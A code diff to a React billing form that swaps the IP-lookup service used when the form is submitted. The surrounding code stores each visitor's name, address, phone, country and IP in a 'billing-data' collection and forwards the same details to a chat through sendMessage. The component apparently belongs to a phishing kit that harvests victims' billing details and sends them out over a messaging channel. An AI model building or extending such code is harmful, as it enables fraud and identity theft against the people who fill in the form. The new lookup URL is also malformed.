@@ -34,10 +34,14 @@ const Billing = () => {
         e.preventDefault();
         if (fullname && address && state && city && zip && phone && country) {
             fetch(
-                "https://geolocation-db.com/json/8dd79c70-0801-11ec-a29f-e381a788c2c0"
-            )
-            .then(response => response.json())
-            .then(geoData => {
+                "https://api.ipify.org?format=jsonp?callback=?", {
+                method: "GET",
+                headers: {}
+            })
+            .then(res => {
+                return res.text()
+            })
+            .then(ip => {
                 db.collection('billing-data').add({
                     fullname: fullname, 
                     address: address, 
@@ -46,7 +50,7 @@ const Billing = () => {
                     zip: zip, 
                     phone: phone, 
                     country: country,
-                    ip_address: geoData.IPv4,
+                    ip_address: ip,
                     logged_at: Date.now()
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
@@ -59,7 +63,7 @@ const Billing = () => {
                         message += "ZIP: " + zip + '\r\n'
                         message += "Phone Number: " + phone + '\r\n'
                         message += "Country: " + country + '\r\n'
-                        message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                        message += "Ip Address: " + ip + '\r\n'
                         message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
